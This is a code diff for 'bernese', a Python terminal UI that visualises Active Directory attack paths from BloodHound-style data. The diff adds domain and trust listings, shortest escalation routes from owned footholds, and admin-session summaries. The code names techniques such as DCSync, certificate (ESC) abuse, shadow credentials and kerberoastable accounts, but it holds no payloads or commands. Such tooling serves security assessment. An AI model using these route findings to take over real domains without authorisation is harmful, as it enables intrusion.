+    if lbl.startswith("ESC") or lbl in ("DCSync", "AdminTo", "AllowedToAct", "GPOAbuse",
+                                         "SpoofSIDHistory", "HasSIDHistory"):
         return bold(red(lbl))
     if lbl == "MemberOf":
         return dim("memberof")
@@ -4372,7 +4776,33 @@ def dashboard_top(g):
     """The compact fact line at the very top of the overview — just the domain and the
     MAQ flag. Populations and position live in the clickable list below."""
     t = Text()
-    t.append(f"{g.domain_name or '?'}\n", style="bold cyan")
+    doms = bh._domains(g)
+    t.append(f"{g.domain_name or '?'}", style="bold cyan")
+    me = next((d for d in doms if d["primary"]), None)
+    if me and me["role"] == "forest root":
+        t.append("  root", style="bold magenta")
+    t.append("\n")
+    others = [d for d in doms if not d["primary"]]
+    if others:
+        # the other known domains on ONE line, cut off with "…" so the narrow overview
+        # doesn't wrap: the forest root first (tagged), then the rest
+        budget = 40
+        t.append("+ ", style="grey50")
+        used = 2
+        for i, d in enumerate(others):
+            tag = " root" if d["role"] == "forest root" else ""
+            piece = d["name"] + tag + (", " if i < len(others) - 1 else "")
+            more = f"… +{len(others) - i}"
+            if used + len(piece) > budget and i:
+                t.append(more, style="grey50")
+                break
+            t.append(d["name"], style="cyan" if d["collected"] else "grey70")
+            if tag:
+                t.append(tag, style="bold magenta")
+            if i < len(others) - 1:
+                t.append(", ", style="grey50")
+            used += len(piece)
+        t.append("\n")
     if isinstance(g.maq, int):
         t.append(f"MAQ {g.maq}" + ("  — any user can add machines" if g.maq > 0 else ""),
                  style="red" if g.maq > 0 else "grey70")
@@ -4415,10 +4845,18 @@ def _fastest_win(g, app):
     laps = sorted({r for r, _c in bh._laps_readers(g)})
     if laps:
         return f"{short(g, laps[0])} reads LAPS ⇒ local admin", "laps"
-    if app.start and not g.is_highvalue(app.start):
-        _size, _hv, best = bh._user_profile(g, app.start)
-        if best:
-            return f"{short(g, app.start)} ⇒ {STAR} {best[0]} ({best[1]}h)", "start_path"
+    # otherwise the quickest route from the start or any owned foothold
+    best = None
+    for s in [app.start] + sorted(app.owned - {app.start}, key=lambda s: short(g, s).lower()):
+        if not s or g.is_highvalue(s):
+            continue
+        rt = route_tag(g, s)
+        if rt and (best is None or rt[2] < best[1][2]):
+            best = (s, rt)
+    if best:
+        s, (tech, tgt, hops) = best
+        return (f"{short(g, s)}: {tech} ⇒ {_tgt_short(tgt)} ({hops}h)",
+                "start_path" if s == app.start else s)
     return None, None
 
 
@@ -4435,6 +4873,32 @@ _RIGHT_EFFECT = {
     "ReadGMSAPassword": "read gMSA password", "ForceChangePassword": "reset their password",
     "AddKeyCredentialLink": "shadow-credential them",
 }
+
+
+def route_tag(g, sid):
+    """(first real technique, high-value target label, hops) of `sid`'s shortest route to a
+    high-value node — the step that actually escalates, skipping free MemberOf hops — or None."""
+    _s, _hv, best = bh._user_profile(g, sid)
+    if not best:
+        return None
+    reach = g.reachable(sid)
+    tgt = min((h for h in reach if h != sid and g.is_highvalue(h)), key=lambda h: reach[h][0])
+    path = g.bfs_path(sid, tgt) or []
+    tech = next((l for _n, l in path[1:] if l and l != "MemberOf"), "MemberOf")
+    return tech, best[0], best[1]
+
+
+def route_text(g, sid):
+    """'NAME: TECH ⇒ target (Nh)' — the compact one-line privesc used in the overview."""
+    rt = route_tag(g, sid)
+    if not rt:
+        return None
+    tech, tgt, hops = rt
+    return f"{short(g, sid)}: {tech} ⇒ {_tgt_short(tgt)} ({hops}h)"
+
+
+def _tgt_short(label):
+    return "domain" if label == "Domain compromise" else label
 
 
 def start_power(g, sid):
@@ -4475,20 +4939,19 @@ def dashboard_position_rows(g, app):
         if g.is_highvalue(app.start):
             rows.append(("start_tree", Text(f"{pad}this node IS high-value", style="bold red"), True))
         else:
-            _s, _h, best = bh._user_profile(g, app.start)
-            if best:
-                rows.append(("start_path",
-                             Text(f"{pad}→ reaches {STAR} {best[0]} in {best[1]} hop(s)",
-                                  style="red"), True))
+            # one compact line, same shape as the OWNED rows: "NAME: TECH ⇒ target (Nh)",
+            # or the strongest right it holds when there is no route to high-value
+            rtxt = route_text(g, app.start)
+            pw = start_power(g, app.start)
+            if rtxt:
+                rows.append(("start_path", Text(f"{pad}{rtxt}", style="red"), True))
+            elif pw:
+                right, cnt, _effect = pw
+                rows.append(("start_info", Text(f"{pad}{short(g, app.start)}: {right} ×{cnt}",
+                                                style="red"), True))
             else:
                 rows.append(("start_tree",
-                             Text(f"{pad}no ACL path to a high-value target", style="grey50"), False))
-            # even without an ACL path, surface the strongest right this node holds —
-            # just the right name + how many objects (no wordy effect text)
-            pw = start_power(g, app.start)
-            if pw:
-                right, cnt, _effect = pw
-                rows.append(("start_info", Text(f"{pad}{right} ×{cnt}", style="red"), True))
+                             Text(f"{pad}no route to a high-value target", style="grey50"), False))
     else:
         rows.append(("start_tree", Text(f"{'START':<8}none — pick a node from Users / Computers",
                                         style="bold grey62"), True))
@@ -5336,6 +5799,7 @@ class ExploreView(AttackTreeBase):
         self.query_one("#ownedtree", Tree).display = False
         other = self.query_one("#othertree", Tree)
         other.clear(); other.root.set_label(Text("")); other.root.data = None
+        other.display = False                    # no stray empty ▶ under "no start"
         self.app.set_detail(intro=Text(
             "Pick a start node (Users / Computers in the menu), then its attack paths appear "
             "here.\n\nSpace/Enter drops a node down; a machine or holder drills into its own "
@@ -5349,6 +5813,7 @@ class ExploreView(AttackTreeBase):
         g, priv = self.g, self.app.priv
         other = self.query_one("#othertree", Tree)
         other.clear()
+        other.display = True
         other.root.data = None
         roast_priv = [n.sid for n in g.nodes.values() if n.kind == "User"
                       and (n.p("hasspn") or n.p("serviceprincipalnames")) and n.sid.rsplit("-", 1)[-1] != "502"
@@ -5532,8 +5997,10 @@ class EscalationView(AttackTreeBase):
         # always sweep EVERY non-admin account — the full domain-wide picture of which
         # low-priv principals reach high-value by ACL, fewest hops first (not scoped to
         # the current start / owned set).
+        # members of Domain/Enterprise Admins are already the goal, not a start point
+        da = bh._da_member_set(g)
         launch = [n.sid for n in g.nodes.values()
-                  if n.kind == "User" and not bh._is_admin(g, n.sid)]
+                  if n.kind == "User" and not bh._is_admin(g, n.sid) and n.sid not in da]
         starts = []
         for s in launch:
             if s not in g.nodes:
@@ -5872,6 +6339,19 @@ class SummaryView(AttackTreeBase):
         self._category(root, "LAPS readers (non-admin → local admin)", laps, style="yellow")
         self._category(root, "Non-admin GPO control", sorted(gpo_ctrl), style="bold red", expand=True)
         self._category(root, "Non-default unconstrained delegation", unc, style="bold red")
+        self._category(root, "Computers with a DA/EA session", [c for c, _u in bh._admin_sessions(g)],
+                       style="bold red", expand=True)
+        dl = bh._domain_lines(g)
+        if len(dl) > 1:
+            dn = root.add(Text(f"Domains ({len(dl)})", style="bold cyan"), expand=True)
+            for txt, is_root in dl:
+                dn.add_leaf(Text(txt, style="bold magenta" if is_root else "grey85")).allow_expand = False
+        tl = bh._trust_lines(g)
+        if tl:
+            tn = root.add(Text(f"Domain trusts ({len(tl)})", style="bold red" if any(b for _t, b in tl)
+                               else "yellow"), expand=True)
+            for txt, bad in tl:
+                tn.add_leaf(Text(txt, style="red" if bad else "grey70")).allow_expand = False
 
         if isinstance(g.maq, int):
             root.add_leaf(Text(f"MachineAccountQuota = {g.maq}"
@@ -6256,9 +6736,29 @@ class HomeScreen(Screen):
         Binding("i", "info", "Node info"),
         Binding("ctrl+s", "set_start", "Set as start"),
         Binding("ctrl+o", "owned", "Mark owned"),
+        Binding("u", "goto('users')", "Users"),
+        Binding("c", "goto('computers')", "Computers"),
+        Binding("g", "goto('groups')", "Groups"),
+        Binding("a", "goto('tree')", "Attack tree"),
         Binding("ctrl+c", "quit", "Quit", priority=True),
         Binding("ctrl+q", "quit", "Quit", priority=True),
     ]
+
+    def action_goto(self, mid):
+        self.dispatch(mid)
+
+    def on_resize(self, event):
+        self._place_version()
+
+    def _place_version(self):
+        """Pin the version tag to the right end of the footer row (it sits on its own
+        layer; a full-width strip would paint over the footer's key legend)."""
+        try:
+            v = self.query_one("#version")
+        except Exception:
+            return
+        w = len(f"bernese v{__version__}") + 2
+        v.styles.offset = (max(0, self.size.width - w), 0)
 
     # (id, label).  COUNTABLE items grey out + read "none" at 0 instances.
     MENU = [
@@ -6350,6 +6850,7 @@ class HomeScreen(Screen):
         yield Static(f"bernese v{__version__}", id="version")   # bottom-right, where the palette was
 
     def on_mount(self):
+        self._place_version()
         self.query_one("#menu").border_title = "menu — ↑↓ · Enter"
         self.query_one("#dashbox").border_title = "overview"
         self.query_one("#sidedetailbox").border_title = "node detail — click for full info"
@@ -6501,12 +7002,20 @@ class HomeScreen(Screen):
             self.app.open_start(sid)
 
     def action_owned(self):
+        before = set(self.app.owned)
         if self._tree_live():
             self._view.act_owned()
         elif isinstance(self._aux, PrincipalTable):
             self._aux.mark_owned()
         elif isinstance(self._aux, AttackTreeBase):        # node info / escalation / rights …
             self._aux.toggle_owned_cursor()
+        # the first foothold you own becomes the start when none is set yet — loaded
+        # quietly into the tree so the current view (e.g. the Users list) stays put
+        added = self.app.owned - before
+        if not self.app.start and len(added) == 1:
+            sid = next(iter(added))
+            self.app.start = sid
+            self._view.load(sid)
         self._refresh()
 
     def action_root_back(self):
@@ -6638,9 +7147,8 @@ class BerneseApp(App):
     /* version tag — overlaid on the right of the footer row (where the palette hint was) */
     Screen { layers: base version; }
     #version {
-        layer: version; dock: bottom; height: 1; width: 100%;
-        content-align: right middle; padding: 0 1;
-        background: transparent; color: $text-muted;
+        layer: version; dock: bottom; height: 1; width: auto;
+        padding: 0 1; background: $footer-background; color: $text-muted;
     }
     """
     TITLE = "bernese"
